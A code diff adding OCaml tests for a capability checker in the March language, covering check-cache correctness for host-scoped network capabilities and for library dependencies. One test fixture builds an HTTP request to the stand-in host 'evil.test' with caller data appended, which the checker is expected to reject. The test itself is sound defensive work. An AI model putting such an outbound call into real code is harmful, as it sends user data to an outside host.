@@ -101,7 +101,100 @@ let test_relaxed_verdict_does_not_satisfy_strict_check () =
   if not (contains out2 expected_error) then
     Alcotest.failf "plain --check on a warm CAS did not print the capability error:\n%s" out2
 
+(* Host scopes are judged on lowered TIR, after the front end (ocap phase 3).
+   A clean `--check` of an in-scope program is cached; editing the URL out of
+   scope must not be answered from that entry, and a rejected run is never
+   cached, so it rejects every time. *)
+let host_scope_src url = Printf.sprintf {|
+mod Main do
+  needs IO.NetConnect, IO.Console
+  mod A do
+    needs IO.NetConnect("127.0.0.1:9")
+    fn go(q : String) : String do
+      match HttpTransport.simple_get(%s) do
+        Ok(_) -> "ok"
+        Err(_) -> "err"
+      end
+    end
+  end
+  fn main(_n : Cap(IO.NetConnect), _c : Cap(IO.Console)) do
+    println(A.go("q"))
+  end
+end
+|} url
+
+let test_warm_check_cache_does_not_mask_host_scope () =
+  let main_exe = Test_helpers.find_main_exe () in
+  let cwd = fresh_dir "check_cas_hostscope_cwd" in
+  let home = fresh_dir "check_cas_hostscope_home" in
+  let march_file = Filename.concat cwd "scoped.march" in
+  write_file march_file (host_scope_src {|"http://127.0.0.1:9/" ++ q|});
+  let rc0, out0 = run_check ~cwd ~home ~flags:"" main_exe march_file in
+  if rc0 <> 0 then Alcotest.failf "in-scope program should check clean:\n%s" out0;
+  write_file march_file (host_scope_src {|"http://evil.test/" ++ q|});
+  for attempt = 1 to 2 do
+    let rc, out = run_check ~cwd ~home ~flags:"" main_exe march_file in
+    if rc = 0 then
+      Alcotest.failf "out-of-scope program accepted on run %d:\n%s" attempt out;
+    if not (contains out "[cap_host_scope]") then
+      Alcotest.failf "run %d rejected, but not for the host scope:\n%s" attempt out
+  done
+
+(* The interpreter caches a clean capability verdict (ocap phase 3).  The
+   entry file is unchanged here; only a MARCH_LIB_PATH dependency is edited
+   to exceed its `needs`, which must be a cache miss and a rejection. *)
+let dep_src needs = Printf.sprintf {|mod CapDep do
+  needs %s
+  fn slurp(p : String) : String do
+    match File.read(p) do
+      Ok(s) -> s
+      Err(_) -> "none"
+    end
+  end
+end
+|} needs
+
+let dep_main = {|mod Main do
+  needs IO.Console, IO.FileRead
+  fn main(c : Cap(IO.Console), f : Cap(IO.FileRead)) do
+    println(CapDep.slurp("/nonexistent/cap_cache"))
+  end
+end
+|}
+
+let test_interp_verdict_cache_tracks_dependency () =
+  let main_exe = Test_helpers.find_main_exe () in
+  let cwd = fresh_dir "interp_cap_cache_cwd" in
+  let home = fresh_dir "interp_cap_cache_home" in
+  let lib = Filename.concat cwd "lib" in
+  Sys.mkdir lib 0o755;
+  let dep = Filename.concat lib "capdep.march" in
+  let entry = Filename.concat cwd "main.march" in
+  write_file entry dep_main;
+  let run () =
+    let out = Filename.concat cwd "run.out" in
+    let rc = Sys.command
+        (Printf.sprintf "cd %s && HOME=%s MARCH_LIB_PATH=%s %s %s > %s 2>&1 </dev/null"
+           (Filename.quote cwd) (Filename.quote home) (Filename.quote lib)
+           (Filename.quote main_exe) (Filename.quote entry) (Filename.quote out)) in
+    (rc, read_file out)
+  in
+  write_file dep (dep_src "IO.Console, IO.FileRead");
+  let rc0, out0 = run () in
+  if rc0 <> 0 then Alcotest.failf "clean program should run:\n%s" out0;
+  let rc1, out1 = run () in
+  if rc1 <> 0 then Alcotest.failf "clean program should run from the cache:\n%s" out1;
+  write_file dep (dep_src "IO.Console");
+  let rc2, out2 = run () in
+  if rc2 = 0 then Alcotest.failf "dependency now exceeds its needs, but it ran:\n%s" out2;
+  if not (contains out2 "[cap_ceiling]") then
+    Alcotest.failf "rejected, but not by the ceiling:\n%s" out2
+
 let tests =
   [ ("--check CAS key vs --no-cap-strict",
      [ Alcotest.test_case "relaxed verdict does not satisfy the strict check" `Quick
-         test_relaxed_verdict_does_not_satisfy_strict_check ]) ]
+         test_relaxed_verdict_does_not_satisfy_strict_check;
+       Alcotest.test_case "warm cache does not mask a host-scope violation" `Quick
+         test_warm_check_cache_does_not_mask_host_scope;
+       Alcotest.test_case "interpreter verdict cache tracks a dependency" `Quick
+         test_interp_verdict_cache_tracks_dependency ]) ]
